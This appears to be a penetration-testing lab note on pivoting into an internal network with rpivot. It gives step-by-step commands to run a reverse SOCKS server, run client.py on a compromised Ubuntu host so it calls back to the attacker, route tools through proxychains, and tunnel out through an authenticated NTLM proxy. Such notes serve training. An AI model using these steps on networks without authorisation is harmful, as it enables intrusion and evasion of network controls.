 1. Core Concept (Theory)

**Rpivot = Reverse SOCKS proxy**

- Creates a tunnel from **internal network → attacker**
    
- Used when:
    
    - No direct access to internal network
        
    - Only outbound connection allowed from pivot
        

---

## Network Understanding

```text
Attack Host (you) → Ubuntu (pivot) → Internal Web Server
```

IPs:

```text
10.10.15.5        → Attack Host
10.129.15.50      → Ubuntu (pivot, accessible)
172.16.5.135      → Internal Web Server (target)
```

Problem:

```text
You cannot directly access 172.16.5.135
```

Solution:

```text
Use Ubuntu as pivot using rpivot
```

---

# 2. How Rpivot Works

Flow:

```text
client.py (Ubuntu) → connects → server.py (Attack Host)
server creates SOCKS proxy → you use proxychains → reach internal network
```

Full path:

```text
Your tool → proxychains (127.0.0.1:9050)
→ rpivot server
→ rpivot client (Ubuntu)
→ 172.16.5.135:80
```

---

# 3. Ports Explanation

- **9999** → Control channel (pivot connects to attacker)
    
- **9050** → SOCKS proxy (used by proxychains)
    

---

# 4. Step-by-Step Execution

---

## STEP 1 — Clone rpivot

Location: Attack Host

```bash
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
```

Why:

- Get tool files (server.py, client.py)
    

---

## STEP 2 — Install Python2.7

Location: Attack Host

```bash
sudo apt-get install python2.7
```

Why:

- rpivot runs on Python 2
    

---

## STEP 3 — Start rpivot server

Location: Attack Host

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Why:

- Listens for incoming pivot connection on port 9999
    
- Creates SOCKS proxy on 9050
    

Meaning:

```text
0.0.0.0 → listen on all interfaces
```

---

## STEP 4 — Transfer rpivot to Ubuntu

Location: Attack Host

```bash
scp -r rpivot ubuntu@10.129.15.50:/home/ubuntu/
```

Why:

- Need client.py on pivot machine
    

---

## STEP 5 — Run rpivot client

Location: Ubuntu (pivot)

First login:

```bash
ssh ubuntu@10.129.15.50
```

Then:

```bash
cd rpivot
python2.7 client.py --server-ip 10.10.15.5 --server-port 9999
```

Why:

- Ubuntu connects back to your machine
    
- Creates reverse tunnel
    

---

## STEP 6 — Verify connection

On Attack Host (server terminal):

Expected:

```text
New connection from host <pivot IP>
```

Why:

- Confirms tunnel established
    

---

## STEP 7 — Configure proxychains

Location: Attack Host

Edit config:

```bash
sudo nano /etc/proxychains.conf
```

Add at bottom:

```text
socks4 127.0.0.1 9050
```

Why:

- Route tools through rpivot proxy
    

---

## STEP 8 — Access internal web server

Location: Attack Host

```bash
proxychains curl http://172.16.5.135
```

OR browser:

```bash
proxychains firefox-esr 172.16.5.135:80
```

Why:

- Traffic goes:
    

```text
Attack → rpivot → Ubuntu → internal web server
```

# 5. NTLM Proxy Case (Theory)

Used when:

```text
Organization uses HTTP proxy with authentication
```

Command:

```bash
python2.7 client.py \
--server-ip <attacker_ip> \
--server-port 9999 \
--ntlm-proxy-ip <proxy_ip> \
--ntlm-proxy-port <proxy_port> \
--domain <domain> \
--username <user> \
--password <pass>
```

Why:

- Allows pivot through authenticated proxy
